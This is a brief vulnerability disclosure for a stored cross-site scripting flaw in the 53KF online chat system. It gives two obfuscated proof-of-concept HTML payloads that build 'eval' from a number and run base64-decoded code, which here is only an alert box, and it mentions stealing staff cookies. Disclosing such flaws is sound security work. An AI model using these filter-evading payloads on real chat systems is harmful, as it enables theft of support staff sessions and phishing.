## 53KF_vuln_xss

When using the 53KF online chat system, it is found that the inserted HTML statements can be successfully executed, and the alarm window and JS script can be executed successfully, thus stealing customer service staff cookies or fishing operations.

## description ：

Cross Site Scripting (XSS) vulnerability in 53KF online chat system product, Affecting versions < 2.0.0.2 . The vulnerabilities could be remotely exploited resulting in Cross-Site Scripting (XSS) or information disclosure.

Exploit Title: There is a stored Cross Site Scripting in 53KF

Date: 2020/10/27

Exploit Author: panzhenhua

Vendor Homepage: http://www.53kf.me/

Version: < 2.0.0.2

Tested on: macOS

## POC:

1、<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//

2、<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>

## verification：
Open 53 online customer service chat window to inject POC
![Image](https://github.com/i900008/panexiang.github.io/blob/gh-pages/2.png
Close the chat window and open it again. The attack is successful
![Image](https://github.com/i900008/panexiang.github.io/blob/gh-pages/1.png
